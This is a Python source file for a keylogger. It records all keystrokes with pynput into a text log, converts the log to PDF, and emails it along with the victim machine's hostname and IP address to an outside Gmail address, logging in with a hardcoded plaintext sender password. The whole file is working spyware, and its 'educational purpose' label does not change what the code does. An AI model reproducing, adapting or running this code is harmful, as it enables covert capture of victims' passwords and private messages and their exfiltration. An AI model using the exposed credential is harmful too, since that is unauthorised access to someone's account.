from pynput.keyboard import Listener, Key, Controller

# Libraries for Email Sending.
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

# Library for converting text to pdf.
from fpdf import FPDF

# Library for getting hostname and ipaddress.
import socket


# Initialize the Key Logger class.
class KeyLogger():

    # All the Keys and values of keyboard.
    keywords = {
        'Key.tab': '\t',
        'Key.caps_lock': ' C ',
        'Key.shift': '',
        'Key.cmd': 'Windows',
        'Key.alt_l': 'Alt-Left ',
        'Key.alt_gr': 'Alt-Right ',
        'Key.ctrl_l': 'Crtl-Left ',
        'Key.ctrl_r': 'Ctrl-Right ',
        'Key.backspace': '\b',
        'Key.up': 'Up',
        'Key.down': 'Down',
        'Key.left': 'Left',
        'Key.right': 'Right',
        'Key.num_lock': ' N ',
        '<110>': '.',
        'Key.space': ' ',
        'Key.enter': '\n',
        'Key.esc': '\n Terminated \n'
    }

    # File names.
    filename_txt = 'log.txt'
    filename_pdf = 'Key Logger.pdf'

    # Calling the text to pdf function.
    def success(self):
        self.text_to_pdf(self.filename_txt, self.filename_pdf)
        print('You are been Hacked Successfully....')

    # Making Key Logger Function.
    def key_logger(self, key):
        letter  = str(key)  # Converting key to string
        letter = letter.replace("'", "")  # Replacing 'String' to String

        # Keys perform their Values.
        if letter in self.keywords:
            letter = self.keywords[letter]

        # Creating a text file and appending the String or Values.
        with open('log.txt', 'a') as f:
            f.write(letter)

    # Converting text to pdf.
    def text_to_pdf(self, filename_txt, filename_pdf):
        pdf = FPDF()
        pdf.add_page()
        pdf.set_font("Arial", size = 15)
        f = open(filename_txt, "r")
        for x in f:
            pdf.cell(200, 10, txt = x, ln = 1, align = 'C')
        pdf.output(filename_pdf)
        # print('Converted Successfull.')

        # Calling the mail function.
        self.send_email(filename_pdf)

    # Sending the email.
    def send_email(self, filename):
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        sender_address = 'portfolio4cv@gmail.com'
        sender_pass = 'Badshah2001'
        receiver_address = 'jaidoshi18@gmail.com'
        mail_content = '''Hello,
        This is a Key Logger mail.
        In this mail we are sending some attachments.
        The mail is consists of Important data donot missuse it.
        It is just for Educational Purpose.
        Hostname : {0}
        IP Address : {1}
        Thank You
        '''.format(hostname, ip_address)
        message = MIMEMultipart()
        message['From'] = sender_address
        message['To'] = receiver_address
        message['Subject'] = 'Key Logger.'
        message.attach(MIMEText(mail_content, 'plain'))
        attach_file_name = filename
        attach_file = open(attach_file_name, 'rb')
        payload = MIMEBase('application', 'octate-stream', Name=attach_file_name)
        payload.set_payload((attach_file).read())
        encoders.encode_base64(payload)
        payload.add_header('Content-Decomposition', 'attachment', filename=attach_file_name)
        message.attach(payload)
        session = smtplib.SMTP('smtp.gmail.com', 587)
        session.starttls()
        session.login(sender_address, sender_pass)
        text = message.as_string()
        session.sendmail(sender_address, receiver_address, text)
        session.quit()
        # print('Mail Sent')

    # Releasing the Logger.
    def exit_logger(self, key):
        if str(key) == "Key.esc":
            return False

